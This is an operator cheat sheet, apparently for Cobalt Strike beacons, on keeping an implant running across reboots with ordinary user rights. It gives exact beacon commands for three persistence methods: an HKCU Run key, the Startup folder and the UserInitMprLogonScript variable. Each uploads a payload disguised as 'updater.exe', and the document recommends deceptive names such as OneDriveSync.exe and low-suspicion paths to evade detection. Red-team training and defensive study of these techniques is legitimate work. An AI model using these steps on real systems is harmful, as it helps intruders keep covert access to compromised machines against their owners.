Maintaining Beacon Persistence Across Reboots with User Privileges
One working method is sufficient.

## 🔧 Method 1: Registry Run Key (HKCU)
✅ Works as a user (no admin privileges required). Good OPSEC.

📋 Description
Uses the registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run to automatically execute a binary when the user logs in.

```powershell
beacon> cd C:\Users\<username>\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads\http_x64.exe
beacon> rename http_x64.exe updater.exe

beacon> reg set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe

🧹 To remove persistence:

powershell
beacon> reg delete HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater
```

## 🔧 Method 2: Startup Folder
✅ Simple and effective persistence without privileges.

📋 Description
Files placed in the user's Startup Programs folder execute at logon.

```powershell
beacon> cd "C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
beacon> upload C:\Payloads\http_x64.exe
beacon> rename http_x64.exe updater.exe
```

## 🔧 Method 3: UserInitMprLogonScript (HKCU Environment)
✅ Less common persistence, still works without admin.

📋 Description
Sets a script to execute at logon via the UserInitMprLogonScript variable, a less suspicious technique.

```powershell
beacon> cd C:\Users\<username>\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads\http_x64.exe
beacon> rename http_x64.exe updater.exe

beacon> reg set HKCU Environment UserInitMprLogonScript REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\updater.exe
```

>🧠 Note the variable name must be exactly: UserInitMprLogonScript.

##🧠 General Recommendations

-📁**Recommended binary path:
%LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe
Common and low suspicion.

-👻 Binary naming:
Use believable names like updater.exe, OneDriveSync.exe, msedgeupdate.exe, etc.

-✅ Test persistence:
Perform logoff/login to verify beacon returns.
